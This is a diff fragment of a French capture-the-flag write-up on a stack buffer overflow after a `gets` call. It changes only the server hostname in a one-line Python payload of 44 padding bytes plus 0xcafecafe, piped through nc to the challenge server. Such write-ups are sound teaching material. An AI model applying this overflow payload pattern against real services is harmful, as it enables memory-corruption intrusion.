@@ -45,7 +45,7 @@ Comme on peut observer dans les instructions suivant l'appel à `gets`, notre ob
 Il faut donc que l'on envoie un payload de 48 bytes, dont les 4 dernières sont 0xcafecafe. Il existe plusieurs manières d'écrire des bytes `raw` via la ligne de commandes. Nous avons utilisé `python` pour le faire.
 
 ```
-python2 -c 'print("A"*44 + "\xfe\xca\xfe\xca")' | nc unitedctf.ca 17000
+python2 -c 'print("A"*44 + "\xfe\xca\xfe\xca")' | nc challenges.unitedctf.ca 17000
 
 ou bien
 
